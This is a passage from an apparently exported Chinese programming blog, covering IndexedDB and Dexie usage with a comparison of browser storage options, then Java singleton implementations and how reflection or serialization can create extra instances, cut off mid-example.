class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.transaction([<span class=\"string\">&#x27;person&#x27;</span>], <span class=\"string\">&#x27;readwrite&#x27;</span>)</span><br><span class=\"line\">.objectStore(<span class=\"string\">&#x27;person&#x27;</span>)</span><br><span class=\"line\">.add(&#123;<span class=\"attr\">id</span>: <span class=\"number\">1</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;thankod&#x27;</span>, <span class=\"attr\">age</span>: <span class=\"number\">24</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">db.transaction([<span class=\"string\">&#x27;person&#x27;</span>], <span class=\"string\">&#x27;readwrite&#x27;</span>)</span><br><span class=\"line\">.objectStore(<span class=\"string\">&#x27;person&#x27;</span>)</span><br><span class=\"line\">.add(&#123;<span class=\"attr\">id</span>: <span class=\"number\">2</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;xuranus&#x27;</span>, <span class=\"attr\">age</span>: <span class=\"number\">24</span>&#125;)</span><br></pre></td></tr></table></figure><br>在浏览器看结果如下：<br><img src=\"5.png\" alt=\"\"></p>\n<p>修改数据：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//change age to 23, name to whoisnian</span></span><br><span class=\"line\">db.transaction([<span class=\"string\">&#x27;person&#x27;</span>], <span class=\"string\">&#x27;readwrite&#x27;</span>)</span><br><span class=\"line\">.objectStore(<span class=\"string\">&#x27;person&#x27;</span>)</span><br><span class=\"line\">.put(&#123;<span class=\"attr\">id</span>: <span class=\"number\">2</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;whoisnian&#x27;</span>, <span class=\"attr\">age</span>: <span class=\"number\">23</span>&#125;)</span><br></pre></td></tr></table></figure><br>删除数据：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// delete data with key &#123;id:1&#125;</span></span><br><span class=\"line\">db.transaction([<span class=\"string\">&#x27;person&#x27;</span>], <span class=\"string\">&#x27;readwrite&#x27;</span>)</span><br><span class=\"line\">.objectStore(<span class=\"string\">&#x27;person&#x27;</span>)</span><br><span class=\"line\">.delete(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure><br>查询数据：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> request2 = db.transaction([<span class=\"string\">&#x27;person&#x27;</span>], <span class=\"string\">&#x27;readwrite&#x27;</span>)</span><br><span class=\"line\">.objectStore(<span class=\"string\">&#x27;person&#x27;</span>)</span><br><span class=\"line\">.get(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">request2.onsuccess = <span class=\"function\">(<span class=\"params\">e</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(request2.result)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// output: &#123;id: 2, name: &quot;whoisnian&quot;, age: 23&#125;</span></span><br></pre></td></tr></table></figure></p>\n<p>IndexedDB原生的API很难用，可以使用第三方封装Dexie，官网：<a href=\"https://dexie.org/\">dexie.org</a><br>引入CDN：<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://unpkg.com/dexie@latest/dist/dexie.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>使用Dexie操作IndexedDB<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//create a database db1</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> db = <span class=\"keyword\">new</span> Dexie(<span class=\"string\">&quot;db1&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//create table person </span></span><br><span class=\"line\"><span class=\"comment\">// with auto_increment primary key (id), </span></span><br><span class=\"line\"><span class=\"comment\">// and column name and age</span></span><br><span class=\"line\">db.version(<span class=\"number\">1</span>).stores(&#123;<span class=\"attr\">person</span>: <span class=\"string\">&quot;++id,name,age&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><br>创建的<code>person</code>数据库中拥有一个自增的主键<code>id</code>，带有索引的两个列<code>name</code>,<code>age</code>（这不意味着就不能插入其他字段了）。用Dexie插入数据：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.person.add(&#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;thankod&#x27;</span>, <span class=\"attr\">age</span>: <span class=\"number\">24</span>&#125;)</span><br><span class=\"line\">ab.person.add(&#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;xuranus&#x27;</span>, <span class=\"attr\">age</span>: <span class=\"number\">24</span>&#125;)</span><br></pre></td></tr></table></figure><br>根据主键获取数据：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> db.person.get(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">// &#123;id:1, name:&#x27;thankod&#x27;, age:24&#125;</span></span><br></pre></td></tr></table></figure><br>条件查询：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> db.person.where(<span class=\"string\">&#x27;age&#x27;</span>).above(<span class=\"number\">20</span>).toArray()</span><br><span class=\"line\"><span class=\"comment\">// &#123;id:1, name:&#x27;thankod&#x27;, age:24&#125;</span></span><br><span class=\"line\"><span class=\"comment\">// &#123;id:2, name:&#x27;xuranus&#x27;, age:24&#125;</span></span><br></pre></td></tr></table></figure><br>修改数据使用<code>put</code>，需要带有主键：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// modify data field &quot;name&quot; </span></span><br><span class=\"line\"><span class=\"comment\">// from &#x27;xuranus&#x27; to &#x27;whoisnian&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">// with primary key &quot;id&quot; = 1</span></span><br><span class=\"line\">db.person.put(&#123;<span class=\"attr\">id</span>:<span class=\"number\">1</span>, <span class=\"attr\">name</span>:<span class=\"string\">&#x27;whoisnian&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><br>关闭数据库：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.close()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"归纳\"><a href=\"#归纳\" class=\"headerlink\" title=\"归纳\"></a>归纳</h2><p>这几种前端存储的共性个性总结如下：</p>\n<table>\n    <tr>\n        <td></td>\n        <td><b>Cookie</b></td>\n        <td><b>LocalStorage</b></td>\n        <td><b>SessionStorage</b></td>\n        <td><b>IndexedDB</b></td>\n        <td><b>WebSQL</b></td>\n        <td><b>Session</b></td>\n    </tr>\n    <tr>\n        <td>存储特性</td>\n        <td colspan=\"4\" style=\"text-align:center\">K-V数据集</td>\n        <td>关系型数据库</td>\n        <td>K-V数据集</td>\n    </tr>\n    <tr>\n        <td>存储位置</td>\n        <td colspan=\"5\" style=\"text-align:center\">客户端</td>\n        <td>服务端</td>\n    </tr>\n    <tr>\n        <td>特性</td>\n        <td>随请求头每次提交</td>\n        <td>长时保存，不随请求头提交</td>\n        <td>页面关闭清空，不随请求头提交</td>\n        <td>本地大容量缓存解决方案</td>\n        <td>关系型数据库，支持SQL语句</td>\n        <td>存储在服务器内存中，安全</td>\n    </tr>\n    <tr>\n        <td>作用域</td>\n        <td colspan=\"2\" style=\"text-align:center\">可跨页，不可跨域</td>\n        <td>不可跨页，不可跨域</td>\n        <td colspan=\"3\" style=\"text-align:center\">可跨页，不可跨域</td>\n    </tr>\n    <tr>\n        <td>最大容量</td>\n        <td>4K</td>\n        <td colspan=\"2\" style=\"text-align:center\">5M</td>\n        <td>移动端25M，客户端50M</td>\n        <td>5M</td>\n        <td>视服务器内存而定</td>\n    </tr>\n    <tr>\n        <td>支持事务</td>\n        <td colspan=\"3\" style=\"text-align:center\">不支持</td>\n        <td colspan=\"2\" style=\"text-align:center\">支持</td>\n        <td>不支持</td>\n    </tr>\n</table>\n\n\n<blockquote>\n<p>参考资料：</p>\n<ul>\n<li><a href=\"http://www.ruanyifeng.com/blog/2018/07/indexeddb.html\">IndexedDB教程</a></li>\n<li><a href=\"https://www.cnblogs.com/pengc/p/8714475.html\">Cookie,Session,LocalStorage和SessionStorage的区别</a></li>\n</ul>\n</blockquote>\n","tags":["前端"]},{"title":"单例模式有几种写法？","url":"/2020/10/22/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%E6%9C%89%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95%EF%BC%9F/","content":"<h2 id=\"懒汉模式（lazy）\"><a href=\"#懒汉模式（lazy）\" class=\"headerlink\" title=\"懒汉模式（lazy）\"></a>懒汉模式（lazy）</h2><p>一般我们所熟知的单例（Singleton）懒汉模式是如下写法：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Singleton instance = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(instance == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">      instance = <span class=\"keyword\">new</span> Singleton();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>但是这种写法在多线程情况下，有可能一个线程已经执行到了<code>if(instance == null)</code>然后判断为<code>true</code>，此时线程切换，另一个线程也执行到这一步，同样判定为<code>true</code>。接下来两个线程都会分别创建一个实例，这就打破了单例的原则。为了解决这一问题，可以给<code>getInstance()</code>方法添加同步锁。<br><span id=\"more\"></span></p>\n<h3 id=\"同步锁\"><a href=\"#同步锁\" class=\"headerlink\" title=\"同步锁\"></a>同步锁</h3><p>修改后代码变为：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Singleton instance = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">static</span> Singleton <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(instance == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">      instance = <span class=\"keyword\">new</span> Singleton();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>这就解决了并发场景下的BUG，但是每次线程调用<code>getInstance()</code>都要请求锁，这在高并发场景下性能很差。于是，又有人提出了一种基于双重检查的方案。</p>\n<h3 id=\"双重检查\"><a href=\"#双重检查\" class=\"headerlink\" title=\"双重检查\"></a>双重检查</h3><p>双重检查可以不用<code>synchronized</code>，每次请求<code>instance</code>不需要请求和释放锁，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Singleton instance = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(instance == <span class=\"keyword\">null</span>) &#123; <span class=\"comment\">//1</span></span><br><span class=\"line\">      <span class=\"keyword\">synchronized</span>(Singleton.class) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(instance == <span class=\"keyword\">null</span>) &#123; <span class=\"comment\">//2</span></span><br><span class=\"line\">          instance = <span class=\"keyword\">new</span> Singleton();<span class=\"comment\">//3</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当线程A B同时执行到1处，假设线程A获得了锁，接着由A创建了<code>instance</code>，并释放锁。接着线程B获得锁，由于之前B判定<code>instance</code>为<code>null</code>，而此时实际已经完成了实例化，需要再次验证<code>instance</code>（2处）是否是<code>null</code>。由于验证的结果不再是<code>null</code>，B释放锁，直接拿返回的<code>instance</code>。</p>\n<p>二次验证看似无懈可击，但实际上有一个隐藏了很深的BUG：JVM在优化执行性能的时候，可能会对局部代码重排序。而一般的对象创建方式是：</p>\n<ul>\n<li>1.分配内存空间</li>\n<li>2.初始化对象成员</li>\n<li>3.返回对象引用</li>\n</ul>\n<p>由于JVM的代码重排机制，1-2-3的顺序可能变成1-3-2，即对象还没创建完毕，引用却已经获得。线程A正在执行3处，此时线程B执行到1处，造成2处判断<code>instance</code>不为<code>null</code>并返回，而此时内存空间内还没有<code>instance</code>对象，B拿到一个没有初始化的<code>instance</code>。</p>\n<p>解决方案是添加<code>volatile</code>关键字：给<code>instance</code>添加<code>volatile</code>访问控制符，作用是取消代码重排优化。修改后的代码如下，这是第一个<strong>比较</strong>正确的写法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">static</span> Singleton instance = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(instance == <span class=\"keyword\">null</span>) &#123; <span class=\"comment\">//1</span></span><br><span class=\"line\">      <span class=\"keyword\">synchronized</span>(Singleton.class) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(instance == <span class=\"keyword\">null</span>) &#123; <span class=\"comment\">//2</span></span><br><span class=\"line\">          instance = <span class=\"keyword\">new</span> Singleton();<span class=\"comment\">//3</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"内部静态类\"><a href=\"#内部静态类\" class=\"headerlink\" title=\"内部静态类\"></a>内部静态类</h3><p>除此之外，还有一种单例的思路。由于静态内部类的加载是ClassLoader机制实现的，初始化必须只能是单一线程完成，统一时间只有一个线程执行初始化，则不存在同步互斥问题。且在第一次调用<code>getInstance()</code>时，才会触发<code>SingletonHolder</code>的<code>&lt;cinit&gt;()</code>方法。<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SingletonHolder</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton instance = <span class=\"keyword\">new</span> Singleton();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> SingletonHolder.instance;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"饿汉模式（eager）\"><a href=\"#饿汉模式（eager）\" class=\"headerlink\" title=\"饿汉模式（eager）\"></a>饿汉模式（eager）</h2><h3 id=\"简单饿汉模式\"><a href=\"#简单饿汉模式\" class=\"headerlink\" title=\"简单饿汉模式\"></a>简单饿汉模式</h3><p>同样是采用ClassLoader初始化静态字段，单例的饿汉模式是线程安全的。<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Singleton instance = <span class=\"keyword\">new</span> Singleton();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>我们似乎发现了正确且简洁的解决方案，但是，上述的“正确写法”（带volatile的双重检查，内部静态类，饿汉模式）真的是安全的吗？实际上，用反射/序列化可以轻易破防。来看这样一段代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Singleton instance1 = Singleton.getInstance();<span class=\"comment\">//用静态方法获取实例</span></span><br><span class=\"line\"></span><br><span class=\"line\">Constructor&lt;Singleton&gt; singletonConstructor = Singleton.class.getDeclaredConstructor();<span class=\"comment\">//获取构造方法</span></span><br><span class=\"line\">singletonConstructor.setAccessible(<span class=\"keyword\">true</span>);<span class=\"comment\">//设置访问控制为true</span></span><br><span class=\"line\">Singleton instance2 = Singleton.newInstance();<span class=\"comment\">//实例化</span></span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(instance1 == instance2);<span class=\"comment\">//false</span></span><br></pre></td></tr></table></figure>\n<p>上述代码可以用于之前任何一种单例的实现。先用<code>getInstance()</code>方法获取到一个实例，然后获取他的一个构造方法，默认是空构造。然后<code>setAccessible(true)</code>，让构造方法无论是<code>private</code>还是<code>public</code>都可以被调用。之后通过反射创建一个新的实例。打印出结果为<code>false</code>，说明我们成功又实例化了一个对象。这已经违背了单例设计的初衷：在内存中最多存在一个对象。</p>\n<p>同理可以用另一种思路：用序列化与反序列化工具。首先让<code>Singleton</code>实现<code>Serializable</code>接口，然后添加系列化反序列依赖：<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.commons<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>commons-lang3<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.8.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>修改代码如下：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Singleton instance1 = Singleton.getInstance();<span class=\"comment\">//用静态方法获取实例</span></span><br><span class=\"line\"><span class=\"keyword\">byte</span>[] serialize = SerializationUtils.serialize(instance1); <span class=\"comment\">//序列化到二进制数据</span></span><br><span class=\"line\">Singleton instance2 = SerializationUtils.deserialize(serialize);<span class=\"comment\">//反序列化到对象</span></span><br><span class=\"line\">System.out.println(instance1 == instance2);<span class=\"comment\">//false</span></span><br></pre></td></tr></table></figure><br>上述代码先创建一个<code>instance</code>实例，然后将实例序列化到字节数组中，再将数据从字节数组中反序列化为对象。打印判等结果为<code>false</code>，于是凭空又创造出一个实例。这种手段可能产生BUG，还可能造成安全性问题。我们发现之前所有的实现方法在现在看来都不够完美了，哪怕是饿汉模式，可以被反射/反序列化二次构造。终极的解决方案是：<strong>枚举类</strong>。</p>\n<h3 id=\"枚举类\"><a href=\"#枚举类\" class=\"headerlink\" title=\"枚举类\"></a>枚举类</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">enum</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    INSTANCE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">doSomething</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//your code here</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;do something&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//object initialized here</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>枚举类实现类似静态类，在调用时初始化，执行构造方法，属于饿汉模式，是线程安全的。使用方法如下：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Singleton instance = Singleton.INSTANCE;</span><br><span class=\"line\">instance.doSomething();</span><br></pre></td></tr></table></figure><br>不同是，枚举类无法在反射中被实例化，再次用试图用反射实例化枚举类单例：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Singleton instance1 = Singleton.INSTANCE;</span><br><span class=\"line\"></span><br><span class=\"line\">Constructor&lt;Singleton&gt; singletonConstructor = Singleton.class.getDeclaredConstructor();</span><br><span class=\"line\">singletonConstructor.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">Singleton instance2 = singletonConstructor.newInstance();</span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(instance1 == instance2);</span><br></pre></td></tr></table></figure><br>这次没有如约输出<code>false</code>，而是运行错误：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Exception in thread &quot;main&quot; java.lang.NoSuchMethodException: Singleton.&lt;init&gt;()</span><br><span class=\"line\">\tat java.lang.Class.getConstructor0(Class.java:3110)</span><br><span class=\"line\">\tat java.lang.Class.getDeclaredConstructor(Class.java:2206)</span><br><span class=\"line\">\tat Main.main(Main.java:26)</span><br></pre></td></tr></table></figure><br>执行<code>getDeclaredConstructor()</code>的时候没有成功，没有获得构造方法，而<code>getDeclaredConstructor()</code>会调用native方法<code>getDeclaredConstructor0()</code>，应该是在JVM层面上对枚举类的实例化做了限制，不允许通过反射获得枚举类的构造器。而下面的代码用<code>getDeclaredConstructors()[0]</code>的确可以获得一个参数列表为<code>(java.lang.String,int)</code>的构造器，但依旧无法实例化：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Singleton instance1 = Singleton.INSTANCE;</span><br><span class=\"line\"></span><br><span class=\"line\">Constructor&lt;Singleton&gt; singletonConstructor = (Constructor&lt;Singleton&gt;) Singleton.class.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\"> singletonConstructor.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">Singleton instance2 = singletonConstructor.newInstance();</span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(instance1 == instance2);</span><br></pre></td></tr></table></figure><br>会有如下报错：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Cannot reflectively create enum objects</span><br><span class=\"line\">\tat java.lang.reflect.Constructor.newInstance(Constructor.java:417)</span><br><span class=\"line\">\tat Main.main(Main.java:25)</span><br></pre></td></tr></table></figure><br>说明JRE中也有对枚举类反射实例化的检查，在<code>newInstance()</code>中，执行了对<code>ENUM</code>访问标识符的检查，所以就算或得到了构造器，也会抛出<code>IllegalArgumentException</code>异常：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@CallerSensitive</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">newInstance</span><span class=\"params\">(Object ... initargs)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> InstantiationException, IllegalAccessException,</span></span><br><span class=\"line\"><span class=\"function\">            IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!override) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!Reflection.quickCheckMemberAccess(clazz, modifiers)) &#123;</span><br><span class=\"line\">            Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class=\"line\">            checkAccess(caller, clazz, <span class=\"keyword\">null</span>, modifiers);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((clazz.getModifiers() &amp; Modifier.ENUM) != <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">&quot;Cannot reflectively create enum objects&quot;</span>);</span><br><span class=\"line\">    ConstructorAccessor ca = constructorAccessor;   <span class=\"comment\">// read volatile</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ca == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        ca = acquireConstructorAccessor();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class=\"line\">    T inst = (T) ca.newInstance(initargs);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> inst;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>而使用序列化/反序列化来操作枚举类单例，并不会出错，<strong>而是反序列化后的对象和原对象引用相同</strong>！</p>\n<p>枚举类型在序列化的时候Java仅仅是将枚举对象的name属性输出到结果中，反序列化的时候则是通过<code>java.lang.Enum</code>的<code>valueOf</code>方法来根据名字查找枚举对象。同时，编译器是不允许任何对这种序列化机制的定制的，因此禁用了<code>writeObject</code>、<code>readObject</code>、<code>readObjectNoData</code>、<code>writeReplace</code>和<code>readResolve</code>等方法。</p>\n<p>普通的Java类的反序列化过程中，会通过反射调用类的默认构造函数来初始化对象。所以，即使单例中构造函数是私有的，也会被反射给破坏掉。由于反序列化后的对象是重新new出来的，所以这就破坏了单例。</p>\n<p>综上，<strong>普通类的反序列化是通过反射实现的，枚举类的反序列化不是通过反射实现的</strong>。所以，枚举类也就不会发生由于反序列化导致的单例破坏问题。</p>\n<h2 id=\"选用更新的JDK\"><a href=\"#选用更新的JDK\" class=\"headerlink\" title=\"选用更新的JDK\"></a>选用更新的JDK</h2><p>如果你的JDK是9以下，尝试这段代码，他可以绕过构造方法<code>newInstance()</code>对枚举类的检查，直接拿到<code>ConstructorAccessor</code>进行实例化。<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Singleton instance1 = Singleton.INSTANCE;</span><br><span class=\"line\"></span><br><span class=\"line\">Constructor c = Singleton.INSTANCE.getClass().getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">Method acquireConstructorAccessor = Constructor.class.getDeclaredMethod(<span 